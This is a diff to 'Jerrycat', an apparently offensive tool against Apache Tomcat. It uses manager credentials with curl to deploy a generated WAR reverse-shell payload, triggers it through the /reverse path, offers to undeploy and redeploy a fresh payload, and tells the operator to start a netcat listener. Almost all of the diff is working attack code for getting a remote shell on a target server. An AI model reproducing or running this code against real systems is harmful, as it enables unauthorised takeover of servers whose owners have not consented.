@@ -21,6 +21,7 @@ from rich.text import Text
 
 import core.utils
 from core.Output import Output
+from core.utils import deploy
 
 # Global variable to access state of args and my single instance of my class output (yes, not the cleanest way)
 global args
@@ -173,6 +174,44 @@ class AuthenticatedAttack(Tomcat):
 
                 output.message(state="settings", description=f"LHOST: {args.lhost} - LPORT: {args.lport}", url="")
 
+                if response.status_code == 200:
+                    # undeploy the reverse if CTRL+C ?
+                    print("[bold red]Jerrycat[/] > Do you want to [bold yellow]UNDEPLOY[/] the current reverse shell ? (y/n)")
+                    print("[bold red]Jerrycat[/] > ", end="")
+                    undeploy = input("")
+
+                    if undeploy.lower() == "y":
+                        endpoint = '/manager/text/undeploy?path=/reverse'
+                        command = f"curl -u '{self.username}:{self.password}' '{self.url}{endpoint}'"
+                        subprocess.run(command, shell=True, check=True, capture_output=True)
+
+                        output.message(state="success", description=f"Undeploy old reverse shell !",
+                                       url=endpoint, clear_before=True)
+                        # generate new one
+                        filename = core.utils.generate_payload(filename=filename, lhost=args.lhost, lport=args.lport)
+
+                        # deploy again
+                        deploy(filename=filename, path='reverse', url=self.url, username=self.username,
+                               password=self.password)
+
+                        output.message(state="ongoing", description=f"Uploading NEW reverse shell",
+                                       url=endpoint)
+                        output.message(state="success", description=f"Triggering NEW reverse shell",
+                                       url=endpoint)
+                    else:
+                        endpoint = '/reverse'
+                        requests.get(url=f"{self.url}{endpoint}")
+                        output.message(state="success", description=f"Triggering OLD reverse shell",
+                                       url=endpoint, clear_before=True)
+
+                        if response.status_code == 200:
+                            output.message(state="exit", description="See you next time!", url="")
+                        else:
+                            output.message(state="error",
+                                           description=f"Oups.. seems we have an error {response.status_code} here",
+                                           url="")
+
+
                 if response.status_code != 200:
 
                     # generate part
@@ -181,11 +220,11 @@ class AuthenticatedAttack(Tomcat):
 
                     # deploy part
 
-                    command = f"curl --upload-file resources/{filename}.war -u '{self.username}:{self.password}' '{self.url}/manager/text/deploy?path=/reverse'"
-                    subprocess.run(command, shell=True, check=True, capture_output=True)
+                    deploy(filename=filename, path='reverse', url=self.url,username=self.username,password=self.password)
+
                     output.message(state="success", description="Uploading revershell", url="")
 
-                    output.message(state="info", description=f"Run this cmd : nc -nlvp {args.lport}",
+                    output.message(state="ongoing", description=f"Run this cmd : nc -nlvp {args.lport}",
                                    url="")
 
                     print("[bold red]Jerrycat[/] > Type [bold yellow]'Run'[/] when your netcat is ready")
